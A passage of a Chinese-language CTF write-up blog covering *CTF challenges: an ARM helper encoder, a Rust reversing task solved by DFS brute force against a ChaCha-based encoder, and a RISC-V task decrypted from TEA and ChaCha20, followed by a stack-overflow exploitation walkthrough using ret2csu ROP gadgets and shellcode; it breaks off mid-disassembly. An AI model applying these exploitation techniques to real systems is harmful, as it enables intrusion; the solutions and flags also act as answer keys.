class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">encode</span><span class="params">(<span class="keyword">int64_t</span> a1)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="keyword">uint64_t</span>)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="keyword">uint64_t</span>)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">31</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="keyword">uint64_t</span>)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="keyword">uint64_t</span>)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">31</span>)) &gt;&gt; <span class="number">13</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int64_t</span> a = <span class="number">0x44010A9FC70042</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> b= encode(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#llx -&gt; %#llx\n&quot;</span>, (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)a, (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint64_t</span> i=<span class="number">0</span>; i&lt;<span class="number">0x100</span>; i++)&#123;</span><br><span class="line">        a = (i &lt;&lt; <span class="number">48</span>) | <span class="number">0x400FF8</span>;</span><br><span class="line">        b = encode(a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    %#llx : %#llx,\n&quot;</span>, (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)b, (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次做出arm pwn. 还是挺有意思的, 最后也贴一下执行脚本和调试脚本:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行脚本</span></span><br><span class="line">qemu-aarch64 -cpu max -g 2234 -L . ./chall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调试脚本</span></span><br><span class="line">gdb-multiarch -q \</span><br><span class="line">  -ex <span class="string">&#x27;set architecture aarch64&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;file chall.bak&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;target remote localhost:2234&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;break *0x400C00&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;break *0x400FF0&#x27;</span> \</span><br><span class="line">  -ex <span class="built_in">continue</span> \</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<h2 id="re-stream"><a href="#re-stream" class="headerlink" title="re-stream"></a>re-stream</h2><p>rust 逆向, 程序大致流程如下</p>
<ol>
<li>打开 flag 文件</li>
<li>读取 flag 文件中的 flag</li>
<li>对 flag 进行一通编码操作</li>
<li>将结果写到 output 文件中</li>
</ol>
<p>我们需要逆向编码逻辑, 然后从 output 中逆出 flag.</p>
<p>思路就是按字节爆破. 但是编码的过程中用到了一个随机数生成器:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rand_chacha::guts::init_chacha</span><br><span class="line">rand_chacha::guts::refill_wide</span><br></pre></td></tr></table></figure>

<p>要想爆破的话也需要调用这两个函数, 因为对 rust 不是很熟悉, 所以花了很多时间研究如何调用这两个函数. 最后是通过直接改库的源码实现的….</p>
<p>直接 DFS 搜索即可:</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::process::exit;</span><br><span class="line"><span class="keyword">use</span> rand_chacha::test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> FLAG_SIZE: <span class="built_in">usize</span> = <span class="number">46</span>;</span><br><span class="line"><span class="keyword">const</span> ENC: [<span class="built_in">u8</span>; FLAG_SIZE]  = [<span class="number">0x3c</span>, <span class="number">0x2f</span>, <span class="number">0x9a</span>, <span class="number">0x41</span>, <span class="number">0xda</span>, <span class="number">0xfe</span>, <span class="number">0x9a</span>, <span class="number">0xa4</span>, <span class="number">0x5e</span>, <span class="number">0x4c</span>, <span class="number">0xa9</span>, <span class="number">0x1c</span>, <span class="number">0x89</span>, <span class="number">0x92</span>, <span class="number">0x96</span>, <span class="number">0xf5</span>, <span class="number">0x38</span>, <span class="number">0xee</span>, <span class="number">0x12</span>, <span class="number">0xdc</span>, <span class="number">0x1b</span>, <span class="number">0x98</span>, <span class="number">0xd</span>, <span class="number">0xf3</span>, <span class="number">0xdc</span>, <span class="number">0x42</span>, <span class="number">0x42</span>, <span class="number">0x72</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x60</span>, <span class="number">0x86</span>, <span class="number">0x91</span>, <span class="number">0xe3</span>, <span class="number">0x1</span>, <span class="number">0x14</span>, <span class="number">0xd4</span>, <span class="number">0x3</span>, <span class="number">0x18</span>, <span class="number">0x7a</span>, <span class="number">0xb8</span>, <span class="number">0x29</span>, <span class="number">0x18</span>, <span class="number">0xe8</span>, <span class="number">0xa1</span>, <span class="number">0x80</span>, ];</span><br><span class="line"><span class="comment">// const ENC: [u8; FLAG_SIZE] = [0x1, 0xa2, 0x76, 0x27, 0x62, 0x14, 0x60, 0xe5, 0xe, 0x22, 0x26, 0xae, 0x60, 0xc1, 0x75, 0x44, 0x4f, 0x1b, 0xc4, 0xe6, 0x78, 0x64, 0x37, 0x6d, 0x89, 0xf6, 0xea, 0x5e, 0x1, 0x42, 0xb1, 0xcb, 0xb2, 0xbd, 0x32, 0x9a, 0x72, 0x61, 0xec, 0x55, 0xcc, 0x64, 0xbc, 0x61, 0xce, 0xcd, ];</span></span><br><span class="line"><span class="keyword">const</span> NONCE: [<span class="built_in">u8</span>; <span class="number">32</span>] = [<span class="number">0</span> <span class="keyword">as</span> <span class="built_in">u8</span>; <span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到的答案需要重新排列一下</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">show</span></span>(flag: &amp;[<span class="built_in">u8</span>; FLAG_SIZE])&#123;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..FLAG_SIZE&#123;</span><br><span class="line">        <span class="keyword">let</span> b = flag[i];</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">        <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, b <span class="keyword">as</span> <span class="built_in">char</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dfs 搜索 flag</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">search</span></span>(key: &amp;<span class="keyword">mut</span> [<span class="built_in">u8</span>; <span class="number">32</span>], idx: <span class="built_in">usize</span>, flag: &amp;<span class="keyword">mut</span> [<span class="built_in">u8</span>; FLAG_SIZE])&#123;</span><br><span class="line">    <span class="keyword">if</span> idx == FLAG_SIZE&#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;found flag&quot;</span>);</span><br><span class="line">        show(flag);</span><br><span class="line">        exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="number">0x20</span>..<span class="number">0x80</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> old_key = key[idx&amp;<span class="number">0x1f</span>];</span><br><span class="line">        <span class="keyword">let</span> old_flag = flag[idx];</span><br><span class="line">        key[idx&amp;<span class="number">0x1f</span>] = ch <span class="keyword">as</span> <span class="built_in">u8</span>;</span><br><span class="line">        <span class="keyword">let</span> res = test(key, &amp;NONCE);</span><br><span class="line">        <span class="keyword">let</span> v1 = res[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">let</span> v2 = v1 ^ ch <span class="keyword">as</span> <span class="built_in">u8</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> v2 == ENC[idx] &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;[+] &#123;&#125; &#123;&#125; (&#123;:#x&#125; = &#123;:#x&#125; ^ &#123;:#x&#125; = &#123;:#x&#125;)&quot;</span>, idx, ch <span class="keyword">as</span> <span class="built_in">u8</span> <span class="keyword">as</span> <span class="built_in">char</span>, ENC[idx], v1, ch <span class="keyword">as</span> <span class="built_in">u8</span>, v2);</span><br><span class="line">            flag[idx] = ch <span class="keyword">as</span> <span class="built_in">u8</span>;</span><br><span class="line">            search(key, idx+<span class="number">1</span>, flag);</span><br><span class="line">        &#125;</span><br><span class="line">        flag[idx] = old_flag;</span><br><span class="line">        key[idx&amp;<span class="number">0x1f</span>] = old_key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> key: [<span class="built_in">u8</span>; <span class="number">32</span>] = [<span class="number">0</span>; <span class="number">32</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> flag: [<span class="built_in">u8</span>; FLAG_SIZE] = [<span class="number">0</span>; FLAG_SIZE];</span><br><span class="line">    search(&amp;<span class="keyword">mut</span> key, <span class="number">0</span>, &amp;<span class="keyword">mut</span> flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// *ctf&#123;EbXZCOD56vEHNSofFvRHG7XtgFJXcUXUGnaaaaaa&#125;</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>test</code> 是在 <code>rand_chacha</code> 库的源码中添加的代码:</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">test</span></span>(key: &amp;[<span class="built_in">u8</span>; <span class="number">32</span>], nonce: &amp;[<span class="built_in">u8</span>]) -&gt; [<span class="built_in">u8</span>; BUFSZ] &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> rng = init_chacha(key, nonce);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> res: [<span class="built_in">u8</span>; BUFSZ] = [<span class="number">0</span>; BUFSZ];</span><br><span class="line">    refill_wide(&amp;<span class="keyword">mut</span> rng, <span class="number">10</span>, &amp;<span class="keyword">mut</span> res);</span><br><span class="line">    res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>emmm , 最后还需要对结果重排一下, 不再赘述.</p>
<hr>
<p>赛后看官方 wp 仓库中本题的源码发现对 rng 的使用很简单:</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut</span> rng = StdRng::from_seed(seed);</span><br><span class="line"><span class="keyword">let</span> r: <span class="built_in">u8</span> = rng.gen();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<h2 id="re-amp-pwn-favourite-architecture"><a href="#re-amp-pwn-favourite-architecture" class="headerlink" title="re&amp;pwn-favourite architecture"></a>re&amp;pwn-favourite architecture</h2><p>这是一个 riscv架构的题目, 一个环境三个题目, 先是一个逆向拿到第一个 flag , 然后是个栈溢出利用 orw 读出第二个 flag , 最后是一个修改 qemu-user 中的 got 表劫持控制流 getshell 拿到第三个 flag.</p>
<p>riscv 架构的题目可以使用 ghidra 9.2 进行反编译(<a target="_blank" rel="noopener" href="https://ghidra-sre.org/">ghidra官网</a>). 调试的话使用原生 gdb+gef 插件远程调试即可, 偶尔会遇到 gef context 命令失败的情况, 不过不影响使用.</p>
<p>启动脚本加调试脚本如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#直接启动</span></span><br><span class="line">./qemu-riscv64 main</span><br><span class="line"></span><br><span class="line"><span class="comment">#调试启动</span></span><br><span class="line">./qemu-riscv64 -g 1234 main</span><br><span class="line"></span><br><span class="line"><span class="comment">#调试脚本</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">gdb-multiarch -q \</span><br><span class="line">  -ex <span class="string">&#x27;set architecture riscv:rv64&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;file main&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;target remote localhost:1234&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;break *0x10456&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;break *0x10464&#x27;</span> \</span><br><span class="line">  -ex <span class="string">&#x27;b *0x104dc&#x27;</span> \</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<p>反编译出现 unknown error 时得手动改 gp 为 <code>0x6f178</code>（ctrl-A → ctrl-R → 找到gp寄存器并修改）(感谢@X1do0发现的解决方案)<br>ghidra 的 entry 函数的最后对 gp 寄存器赋成了这个值(<code>0x6f178</code>), 后面 ghidra 又识别不出来了，得手动改成这个. 这个值也可以通过调试确定</p>
<p>后面两个pwn部分宇轩大佬的wp也总结的很清楚, 可以结合阅读: <a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/01/22/riscv/#">https://xuanxuanblingbling.github.io/ctf/pwn/2021/01/22/riscv/#</a></p>
<h3 id="first-flag-reverse"><a href="#first-flag-reverse" class="headerlink" title="first flag-reverse"></a>first flag-reverse</h3><p>binary 是静态编译+去符号的, 又是 riscv. 所以很多库函数认不出来.</p>
<p>赛后看源码发现其实就是把 flag 分成两部分(姑且称之为 flag_a, flag_b). 然后对 flag_a 用 chacha20 流密码算法进行加密, 对 flag_b 用 tea 算法(改了轮次)进行加密. 拿到题目后用 ida 的 findcrypt 插件可以发现有 salsa20 算法的特征, 但是并没有发现 tea 的特征. 后来分析的时候发现 tea 中的那个 0x9e3779b9 是通过下面两条指令生成的:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">000102d4 b7 87 37 9e     lui        a5,0x9e378 # a5 &#x3D; signed_extend_to_64bit(0x9e378 &lt;&lt; 12) &#x3D; 0x9e378000</span><br><span class="line">000102d8 9b 87 97 9b     addiw      a5,a5,-0x647 # a5 &#x3D; 0x9e3779b9</span><br></pre></td></tr></table></figure>

<p>因为 riscv 中一个指令的长度只能是 2 字节或 4 字节, 所以对于一些 32 位的立即数就需要几条指令合作实现, 也就解释了 findcrypt 插件识别不到的原因.</p>
<p>题目还把 tea 算法改了一下, circle 从 32 轮改成了 16 轮, 我就直接把标准解码代码的轮次改成 16 次发现不行, 经过坤坤指点才意识到需要把 sum 也给改了, 改成16 轮时的 sum. 最终脚本如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;chacha20.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> flag1_len  0x29</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> flag2_len  0x30</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># get the right `sum`</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tea_enc</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span>  </span><br><span class="line">        sum += delta;  </span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%#x\n&quot;</span>, sum);</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tea_dec</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xe3779b90</span>, i;  <span class="comment">/* set up */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">16</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span>  </span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);  </span><br><span class="line">        sum -= delta;  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    tea_enc();</span><br><span class="line">    <span class="keyword">char</span> flag1[flag1_len] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chacha20_context</span> <span class="title">context</span>;</span></span><br><span class="line">    chacha20_init_context(&amp;context, <span class="string">&quot;tzgkwukglbslrmfjsrwimtwyyrkejqzo&quot;</span>,<span class="string">&quot;oaeqjfhclrqk&quot;</span>,<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">char</span> *flag1_enc_ro = <span class="string">&quot;\x88\xE7\x03\xB4\x36\xCD\x97\xAB\x5A\xA5\xA6\x0B\xDF\xCE\x08\x3B\x9D\x90\x32\x3C\x4E\x15\x14\xBD\x8D\x38\x38\xB0\xEE\x2A\xBC\x4B\xF9\xAA\x24\x26\x76\xA3\xA5\x75\x5E&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// char *flag1_enc[flag1_len]</span></span><br><span class="line">    <span class="built_in">memcpy</span>(flag1, flag1_enc_ro, flag1_len);</span><br><span class="line"></span><br><span class="line">    chacha20_xor(&amp;context, flag1, flag1_len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> flag2[<span class="number">13</span>]=&#123;<span class="number">3293612025</span>,<span class="number">117699250</span>,<span class="number">1769272380</span>,<span class="number">3988044633</span>,<span class="number">267431978</span>,<span class="number">8724722</span>,<span class="number">4258079709</span>,<span class="number">889342069</span>,<span class="number">4057446099</span>,<span class="number">1962023905</span>,<span class="number">3408772882</span>,<span class="number">2763281398</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">4</span>]=&#123;<span class="number">325623995</span>, <span class="number">420138526</span>, <span class="number">903390039</span>, <span class="number">650062945</span>&#125;;  </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">        tea_dec(&amp;flag2[i*<span class="number">2</span>], k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s%s&quot;</span>, flag1, (<span class="keyword">char</span> *)flag2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="second-flag-orw"><a href="#second-flag-orw" class="headerlink" title="second flag-orw"></a>second flag-orw</h3><p>后面两个部分网上已经有很多 wp 了, 宇轩师傅的 wp 就很详细: <a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/01/22/riscv/#">https://xuanxuanblingbling.github.io/ctf/pwn/2021/01/22/riscv/#</a></p>
<p>gets 那个地方有个栈溢出, 因为 qemu-user 是没有随机化的, 而且本题栈是可执行的, 所以有些师傅的做法就是把 shellcode 写到栈上, 然后到栈上执行. 不过这种方法还是需要调试拿到栈地址, 而且本地和远程栈地址可能还不一样, 好在这题提供了 Dockerfile , 所以本地可以搭一个和远程一样的环境. 我复现的时候选择了更通用的方法: rop+shellcode.</p>
<p>说到 rop 就离不开 csu_init, ret2csu 通用性是真的强, 从 x86 到 amd64 到 aarch64 都很通用, 到了 riscv 也很通用.  csu_init 通常是 <strong>libc_start_main的第四个参数</strong>, 对于去符号的 binary 我们可以通过这个性质定位到 csu_init 函数. 本题中位于<code>0x00011720</code>处. 反编译得到的伪代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UndefinedFunction_00011720</span><span class="params">(undefined8 param_1,undefined8 param_2,undefined8 param_3)</span></span>&#123;</span><br><span class="line">  undefined **ppuVar1;</span><br><span class="line">  longlong lVar2;</span><br><span class="line">  </span><br><span class="line">  ppuVar1 = &amp;PTR_FUN_0006cb80;</span><br><span class="line">  lVar2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    lVar2 = lVar2 + <span class="number">1</span>;</span><br><span class="line">    (*(code *)*ppuVar1)(param_1,param_2,param_3,*ppuVar1);</span><br><span class="line">    ppuVar1 = (code **)ppuVar1 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> (lVar2 != <span class="number">1</span>);</span><br><span class="line">  ppuVar1 = &amp;PTR_FUN_0006cb88;</span><br><span class="line">  lVar2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    lVar2 = lVar2 + <span class="number">1</span>;</span><br><span class="line">    (*(code *)*ppuVar1)(param_1,param_2,param_3,*ppuVar1);</span><br><span class="line">    ppuVar1 = (code **)ppuVar1 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> (lVar2 != <span class="number">1</span>);</span><br><span class="line">  gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们选取其中的这部分代码进行利用:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">00011772 93 07 84 b8     addi       a5,s0,-0x478</span><br><span class="line">00011776 13 09 09 b9     addi       s2,s2,-0x470</span><br><span class="line">0001177a 33 09 f9 40     sub        s2,s2,a5</span><br><span class="line">0001177e 13 59 39 40     srai       s2,s2,0x3</span><br><span 